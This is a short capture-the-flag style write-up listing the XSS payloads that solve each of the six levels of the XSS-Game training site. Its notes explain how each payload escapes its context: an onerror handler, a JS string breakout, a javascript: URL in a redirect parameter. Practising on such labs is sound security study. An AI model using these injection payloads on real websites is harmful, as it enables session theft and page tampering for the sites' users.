---
vulnerability: XSS
platform: XSS-Game
difficulty: Medium
date: 2025-11-30
---

# Level 1 : 

`<script>alert()</script>`

# level 2 : 

`<img src=x onerror=alert(VP)>`

# level 3 : 

`<img src='/static/level3/cloud" + num + ".jpg' onerror=alert(VP)>`
- I was able to figure it out when i viewed the source code
# level 4 :

`3'); alert(VP); // `
- we used this to escape from the JS context > onload="startTimer('{{ timer }}');
- That {{timer}} is where our input is inserted

# level 5 : 
`javascript%3Aalert%28%27VP%27%29`
- Click on the `sign up` button, then in the `URL` change the `next=` param's value from :
	- **confirm** to the **payload** (shown above) 

# level 6 :
`data:text/plain,alert(VP)`
- In the URL replace everything after the `frame#` with the **payload** above